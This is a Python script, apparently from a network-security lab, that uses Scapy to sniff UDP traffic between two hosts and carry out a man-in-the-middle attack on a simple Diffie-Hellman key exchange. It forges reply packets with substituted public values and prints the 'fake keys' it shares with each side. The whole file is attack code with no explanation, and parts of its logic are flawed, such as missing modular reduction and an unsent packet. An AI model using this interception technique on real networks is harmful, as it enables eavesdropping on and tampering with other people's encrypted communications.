#!/usr/bin/python3

from scapy.all import *
import struct
import math

IP_A="192.168.60.2"
IP_B="10.0.2.7"
MAC_A= "02:42:c0:a8:3c:02"
MAC_B= "02:42:0a:00:02:07"
s = 7
t = 4

def spoof_pkt(pkt):

    data = pkt[UDP].payload.load
    a = IP(src=pkt[IP].dst,dst=pkt[IP].src)
    b = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
    c = IP(dst=pkt[IP].dst,src=pkt[IP].src)
    d = UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport)

    info = struct.unpack("iii", data)
    g = info[0]
    p = info[1]
    if pkt[IP].src == IP_A:
        Y_client = info[2]
        print('g : %d, p : %d, Ya : %d' % (g, p, Y_client))
        payload = struct.pack("iii", g, p, g ** s)
        key = (Y_client ** s) % p
        print("The fake key to A is %s" %key)
        
        newpkt = a/b/payload
   
        send(newpkt)

        payload = struct.pack("iii", g, p, t)
        newpkt = c/d/payload
        send(newpkt)

    if pkt[IP].src == IP_B:
        Y_server = info[2]
        print('g : %d, p : %d, Yb : %d' % (g, p, Y_server))
        payload = struct.pack("iii", g, p, g ** t)
        key = (Y_server ** t) % p
        print("The fake key to server is %s" %key)



f = 'udp and (ether src ' + MAC_A + ' or ' + 'ether src ' + MAC_B + ' )'
pkt = sniff(filter=f, prn=spoof_pkt)